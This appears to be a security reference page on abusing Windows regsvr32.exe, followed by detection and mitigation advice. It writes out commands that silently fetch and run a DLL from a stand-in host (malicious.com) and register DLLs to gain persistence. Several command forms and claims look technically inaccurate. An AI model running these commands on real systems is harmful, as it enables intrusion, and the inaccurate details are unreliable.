# regsvr32.exe
## What is it?
*```regsvr32.exe``` is a Windows utility that registers and unregisters dynamic link library (DLL) files and ActiveX controls (.ocx files) in the system registry. It is a part of the Windows operating system and is often used by administrators and developers to register libraries or controls that are required by other applications.*

*While legitimate for registering DLLs, it can also be exploited by attackers to run malicious code hidden in a DLL file, bypassing security defenses, and evading detection.*

## Legitimate Usage
- **Registering DLL Files** → Used to register DLL files that are required by applications.
- **Managing ActiveX Controls** → Registers and unregisters ActiveX controls on the system.
- **Application Dependency Management** → Ensures that the required libraries and controls are available for applications to function properly.
- **Updating DLLs in System or Applications** → Facilitates updates and fixes for applications that rely on specific versions of DLLs.

## How to abuse it
- **Executing Malicious Code** → Attackers can use ```regsvr32.exe``` to load and execute malicious DLL files, bypassing security software or application whitelisting tools.
- **Bypassing Application Control Policies** → Because ```regsvr32.exe``` is a trusted, system utility, attackers can use it to execute payloads without triggering security defenses.
- **Persistence via DLL Registration** → Malicious DLLs can be registered via ```regsvr32.exe``` to persistently maintain access to a compromised system.
- **Bypassing Script Execution Restrictions** → Attackers can load malicious scripts through DLLs and execute them without triggering restrictions in place for traditional scripting engines (e.g., PowerShell).

## Example attacks
### 1. Running Malicious Code via DLL
*Attackers can use ```regsvr32.exe``` to execute malicious code by loading a DLL that contains the payload.*

**Run Malicious DLL with regsvr32**

```
regsvr32.exe /s /u /i:http://malicious.com/malicious.dll
```

**Effect:**
- **```/s```** → Runs silently (no user prompts).
- **```/u```** → Unregisters the DLL (can be used for cleanup or after execution).
- **```/i:http://malicious.com/malicious.dll```** → Specifies a URL to a malicious DLL that is executed on the system.
- The DLL is downloaded and executed, providing the attacker with the ability to run arbitrary code.

### 2. Persistence via DLL Registration
*Attackers can register a malicious DLL that runs on system startup, allowing them to maintain persistent access to the compromised machine.*

**Register Malicious DLL for Persistence**

```
regsvr32.exe /s /i:malicious.dll
```

**Effect:**
- **```/i:malicious.dll```** → Registers the malicious DLL.
- The DLL is executed as part of the registration process, and it can remain persistent by running each time the system reboots.

### 3. Bypassing Application Whitelisting
*Because ```regsvr32.exe``` is a trusted Windows binary, it may bypass application whitelisting or endpoint protection software that would otherwise block the execution of malicious files.*

**Bypass Whitelisting with regsvr32**

```
regsvr32.exe /s /u /i:malicious.dll
```

**Effect:**
- The use of a trusted system tool like ```regsvr32.exe``` allows attackers to execute malicious code even if direct execution of the file is blocked by whitelisting policies.
- The attack is executed silently, without triggering prompts or alerts.

### 4. Remote Execution of Malicious DLLs
*Attackers can use ```regsvr32.exe``` to download and execute malicious DLLs from remote servers.*

**Download and Execute Malicious DLL**

```
regsvr32.exe /s /u /i:http://malicious.com/malicious.dll
```

**Effect:**
- The malicious DLL is downloaded from a remote server and executed silently on the compromised machine.
- Attackers can use this technique to exfiltrate data, install malware, or establish remote control over the system.

### 5. DLL Hijacking with regsvr32
*An attacker can create a malicious DLL with the same name as a legitimate DLL and use ```regsvr32.exe``` to register it, exploiting DLL hijacking vulnerabilities.*

**Exploit DLL Hijacking via regsvr32**

```
regsvr32.exe /s /i:malicious.dll
```

**Effect:**
- The attacker places a malicious DLL with the same name as a legitimate DLL in a trusted directory, ensuring that it is executed when the legitimate DLL is loaded.
- This allows for exploitation of DLL hijacking vulnerabilities to execute arbitrary code on the system.

# Detection & Mitigation
## Detection Methods
**Monitor regsvr32.exe Executions**
- **Event ID 4688 (Process Creation)** → Look for the execution of ```regsvr32.exe``` with unusual command-line arguments (e.g., downloading DLLs from suspicious URLs).
- **Network Traffic Analysis** → Monitor for connections to suspicious domains or IP addresses from which DLLs are being downloaded.
- **File Integrity Checks** → Detect changes in the system registry or unexpected DLL registrations.

**Suspicious DLL Registration**
- **Event ID 4697 (Service Installation)** → Detect the installation of DLL files via ```regsvr32.exe``` that may be associated with suspicious or unknown software.
- **Look for unusual DLL files** in trusted system directories or other sensitive locations.

## Mitigation Strategies
- **Use Application Control** → Implement Application Whitelisting (AppLocker or WDAC) to prevent unauthorized execution of ```regsvr32.exe``` or the registration of untrusted DLLs.
- **Monitor Windows Event Logs** → Regularly review the Event Viewer for suspicious ```regsvr32.exe``` activity, particularly in conjunction with DLL registration events.
- **Restrict User Privileges** → Limit administrative privileges and prevent unauthorized users from executing ```regsvr32.exe``` or registering DLL files.
- **Block Untrusted Network Traffic** → Block the download of DLL files from untrusted URLs or external servers via firewall or network controls.
- **Limit DLL Registration** → Restrict DLL registration and execution capabilities to only trusted applications and users.
